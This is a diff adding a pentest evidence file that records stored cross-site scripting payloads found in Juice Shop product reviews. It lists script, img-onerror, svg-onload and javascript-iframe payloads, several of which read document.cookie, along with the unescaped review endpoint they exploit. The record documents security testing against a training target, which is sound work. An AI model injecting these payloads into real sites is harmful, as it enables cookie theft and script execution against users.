@@ -1,0 +1,49 @@
+================================================================================
+RAW EVIDENCE - Stored XSS in Juice Shop Product Reviews
+================================================================================
+
+--- Product 1 Reviews ---
+[!] STORED XSS PAYLOAD
+    Author:  test
+    Payload: <script>alert(1)</script>
+
+[!] STORED XSS PAYLOAD
+    Author:  pentest-evidence
+    Payload: <script>alert(document.cookie)</script>
+
+--- Product 2 Reviews ---
+[!] STORED XSS PAYLOAD
+    Author:  xsstest
+    Payload: <img src=x onerror=alert(document.cookie)>
+
+--- Product 3 Reviews ---
+[!] STORED XSS PAYLOAD
+    Author:  xsstest2
+    Payload: <svg onload=alert(document.domain)>
+
+--- Product 4 Reviews ---
+[!] STORED XSS PAYLOAD
+    Author:  xsstest3
+    Payload: <iframe src="javascript:alert(`XSS_CONFIRMED`)">
+
+--- Product 5 Reviews ---
+[!] STORED XSS PAYLOAD
+    Author:  verify_run_1
+    Payload: <script>alert('xss-verify-1-1775987287')</script>
+
+[!] STORED XSS PAYLOAD
+    Author:  verify_run_2
+    Payload: <script>alert('xss-verify-2-1775987287')</script>
+
+[!] STORED XSS PAYLOAD
+    Author:  verify_run_3
+    Payload: <script>alert('xss-verify-3-1775987287')</script>
+
+
+================================================================================
+API ENDPOINT: PUT /rest/products/{id}/reviews
+PARAMETER:    message (string, no HTML escaping)
+AUTH:         Required (any valid Bearer token)
+METHOD:       Stored (persists in NeDB database)
+CONFIRMED:    3/3 reproduction cycles successful
+================================================================================
